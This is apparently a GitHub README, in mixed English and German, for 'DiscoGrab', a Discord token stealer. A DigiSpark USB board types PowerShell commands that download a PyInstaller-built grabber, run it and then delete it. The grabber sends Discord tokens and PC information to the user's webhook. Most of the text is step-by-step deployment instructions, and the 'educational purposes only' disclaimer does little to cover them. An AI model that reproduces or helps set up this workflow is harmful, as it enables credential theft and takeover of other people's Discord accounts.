
# DiscoGrab

A DigiSpark-based tool for educational purposes that demonstrates how Discord tokens can be captured using a combination of Python and DigiSpark scripts.

[![GitHub stars](https://img.shields.io/github/stars/corehub-lol/DiscoGrab?style=for-the-badge&logo=github&color=blue)](https://github.com/corehub-lol/DiscoGrab/stargazers)
[![GitHub forks](https://img.shields.io/github/forks/corehub-lol/DiscoGrab?style=for-the-badge&logo=github&color=blue)](https://github.com/corehub-lol/DiscoGrab/network/members)
[![GitHub issues](https://img.shields.io/github/issues/corehub-lol/DiscoGrab?style=for-the-badge&logo=github&color=blue)](https://github.com/corehub-lol/DiscoGrab/issues)
[![GitHub license](https://img.shields.io/github/license/corehub-lol/DiscoGrab?style=for-the-badge&logo=github&color=blue)](https://github.com/corehub-lol/DiscoGrab/blob/main/LICENSE)

---

## Table of Contents

- [Overview](#overview)
- [Disclaimer](#disclaimer)
- [Requirements](#requirements)
- [Setup Instructions](#setup-instructions)
  - [Python Script Setup](#python-script-setup)
  - [Creating the Executable](#creating-the-executable)
  - [DigiSpark Script Setup](#digispark-script-setup)
- [Usage](#usage)
- [How It Works](#how-it-works)
- [Video Tutorial](#video-tutorial)
- [Contributing](#contributing)
- [License](#license)

---

## Overview

DiscoGrab is a demonstration tool that shows how Discord tokens can be captured using a DigiSpark board. The project consists of two main components:

1. **Python Script** – Captures Discord tokens and sends them to a Discord webhook  
2. **DigiSpark Script** – Deploys the Python executable on the target system

This project is based on the [corehub-lol/DiscoGrab](https://github.com/corehub-lol/DiscoGrab) repository.

---

## Disclaimer

**IMPORTANT**: This tool is provided for **EDUCATIONAL PURPOSES ONLY**.

- Using this tool to access accounts without explicit permission is illegal and unethical  
- The author assumes no liability for misuse of this software  
- Use responsibly and only on systems you own or have explicit permission to test

---

## Requirements

- [Python 3.6+](https://www.python.org/downloads/)
- [PyInstaller](https://pyinstaller.org/en/stable/)
- [Arduino IDE](https://www.arduino.cc/en/software)
- [DigiSpark ATtiny85 board](https://www.digistump.com/products/1)
- [DigiSpark Arduino Library](https://github.com/digistump/DigistumpArduino)
- GitHub account (for hosting the executable)

---

## Setup Instructions

### Python Script Setup

```bash
git clone https://github.com/corehub-lol/DiscoGrab.git
cd DiscoGrab
```

1. Open `main.py` in your editor  
2. Ersetze die Zeile mit dem Webhook durch deinen eigenen:

```python
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
```

3. Speichern

---

### Creating the Executable

1. Installiere PyInstaller:

```bash
pip install pyinstaller
```

2. Erstelle das Executable:

```bash
python -m PyInstaller --onefile main.py
```

3. Die Datei befindet sich im `dist`-Ordner  
4. Lade sie auf GitHub als Release-Asset hoch und kopiere den Direktlink

---

### DigiSpark Script Setup

1. Installiere Arduino IDE und richte DigiSpark ein:
   - `File > Preferences > Additional Board Manager URLs`  
     ```http
     http://digistump.com/package_digistump_index.json
     ```
   - `Tools > Board > Boards Manager > Digistump AVR Boards` installieren

2. Öffne `main.ino`  
3. Ersetze `YOUR DOWNLOAD LINK` in Zeile 18 mit deinem GitHub-Link  
4. Speichern

---

## Usage

1. Verbinde DigiSpark mit dem PC  
2. Öffne `main.ino` in der Arduino IDE  
3. Wähle Board: `Digispark (Default - 16.5MHz)`  
4. Drücke Upload  
5. Wenn aufgefordert: DigiSpark anschließen

Was passiert:
- PowerShell wird geöffnet  
- Executable wird heruntergeladen  
- Es wird ausgeführt und Token + Infos an deinen Webhook gesendet  
- Danach wird es gelöscht

---

## How It Works

### `main.ino`
- Simuliert Tastatureingabe über USB
- Öffnet PowerShell
- Führt einen Befehl aus, der dein Executable herunterlädt und ausführt
- Löscht es danach

### `main.py`
- Durchsucht Discord Speicherorte
- Holt gefundene Tokens
- Sendet sie über Webhook
- Sammelt PC-Infos (Windows only)

---

## Video Tutorial

[![Watch the video](https://img.youtube.com/vi/58ugvXHy0mI/hqdefault.jpg)](https://www.youtube.com/watch?v=58ugvXHy0mI)

> 🎥 **DiscoGrab Setup Tutorial** – auf Deutsch

---

## Contributing

Contributions for educational improvements are welcome:

```bash
# Fork und Branch erstellen
git checkout -b feature/improvement

# Änderungen committen
git commit -m "Add educational improvement"

# Pushen
git push origin feature/improvement
```

Dann bitte ein Pull Request stellen.

---

## License

This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.

---

<div align="center">
  <sub>Created for educational purposes only. Use responsibly.</sub>
</div>
```

